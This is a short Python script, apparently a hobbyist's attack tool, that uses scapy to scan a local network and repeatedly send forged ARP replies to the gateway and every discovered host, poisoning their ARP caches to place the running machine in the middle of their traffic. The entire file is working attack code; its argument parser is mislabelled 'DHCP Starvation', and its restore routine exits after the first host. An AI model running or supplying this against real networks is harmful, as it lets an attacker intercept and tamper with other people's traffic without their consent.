import scapy.all as scapy
import time
import networkscanner
import sys


class lets_spoof:
    def mac(self,ip):
        """
        This Function is used to Detect the MAC Address of Provided IP by Sending ARP packets
        :param ip: Target IP
        :return:
        """
        ans, _ = scapy.srp(scapy.Ether(dst='ff:ff:ff:ff:ff:ff') / scapy.ARP(pdst=ip), timeout=3, verbose=0)
        return ans[0][1].hwsrc


    def arp(self,target_ip, spoof_ip):
        """
        This function sends ARP poisoning packets to both router and victim by sending its own MAC address as legit
        :param target_ip: Victim
        :param spoof_ip: Desired IP to spoof
        :return:
        """
        mac_target = self.mac(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac_target, psrc=spoof_ip)  # op 1 is request and 2 is response
        scapy.send(packet, verbose=False)  # verbose is an argument that doesnt allow it send to repeat



    def reset(self,dst_ip, src_ip):
        dst_mac = self.mac(dst_ip)
        src_mac = self.mac(src_ip)
        packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
        scapy.send(packet, count=5)  #send this packet 4 times using count



    def Main(self,network):
        gateway_ip = networkscanner.Network(0)
        try:
            packet_count = 0
            # network = networkscanner.Network(1)  # Contains Netowrk ID
            scan_result = networkscanner.scan(network)
            print(network)
            print(scan_result)

            while True:
                for ip in scan_result:
                    self.arp(gateway_ip, ip["ip"])
                    self.arp(ip["ip"], gateway_ip)    # PC Is the Target
                    packet_count = packet_count + 2
                    print("\rPacket Sent:" + str(packet_count), end="")  # \r lae sabai cheez first ma print garcha
                    time.sleep(10)

        except KeyboardInterrupt:
            print("\n\n[+] Restoring ARP to original.")
            network = networkscanner.Network(1)  # Contains Netowrk ID
            scan_result = networkscanner.scan(network)
            for ip in scan_result:
                # Restoring MAC in Router
                self.reset(gateway_ip, ip["ip"])
                # Restoring MAC in PC
                self.reset(ip["ip"], gateway_ip)
                sys.exit()

if __name__ == "__main__":
    import argparse
    network = networkscanner.Network(1)
    print(network)
    parser = argparse.ArgumentParser(description='DHCP Starvation')
    parser.add_argument('-n', '--network', default=network, action='store_true',
                        help='persistent?')

    args = parser.parse_args()


    lets_spoof().Main(network=args.network)

